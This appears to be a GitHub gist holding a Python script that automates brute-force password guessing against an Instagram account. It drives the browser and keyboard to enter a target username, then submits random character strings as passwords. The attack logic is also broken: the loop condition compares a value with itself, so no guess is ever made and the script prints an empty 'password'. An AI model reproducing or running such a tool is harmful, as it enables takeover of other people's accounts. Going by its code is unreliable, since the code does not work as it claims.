#date: 2022-02-08T16:51:51Z
#url: https://api.github.com/gists/fcf0e4e8dec98ea78ebf5ee700bfa952
#owner: https://api.github.com/users/ANT0R3X

from webbot import Browser
from pynput.keyboard import Key, Controller
import time
import random
#samscript #contact:wa.me//+972557257749


#----------  -----------   -----    -----
#|           |         |   |    |   |   |
#|_________  |  _____  |   |      |     |
#         |  |         |   |            |
#_________|  |         |   |            |


username = ''
print('Inserisci username...' + username)
username = input()
web = Browser()
keyboard = Controller()
web.go_to('instagram.com')
time.sleep(5)
keyboard.press(Key.f6)
keyboard.release(Key.f6)
time.sleep(3)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(3)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
time.sleep(3)
web.type(username)
# username
keyboard.press(Key.tab)
keyboard.release(Key.tab)

word = ["0", "1", "2", "3",
        "4", "5", "6", "7", "8", "9",
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
        "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
        "u", "v", "w", "x", "y", "z", "A", "B", "C", "D",
        "E", "F", "G", "H", "I", "J", "K", "L", "M", "N",
        "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X",
        "Y", "Z", ",", ";", ".", ":", "-", "_", "ò", "ç",
        "@", "à", "°", "#", "ù", "§", "è", "é", "[", "]",
        "+", "*", "=", "(", ")", "ì", "^", "?", "'", "/",
        "£", "$", "%", "&", "{", "}"]
word_list = list(word)
guess = ''
while(guess != guess):
    guess = random.choices(word_list,k=len(guess))
    print(guess)
    guess = ''.join(guess)
    print(guess)
    web.type(guess, into='Password')
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
print('the password is ' + guess)





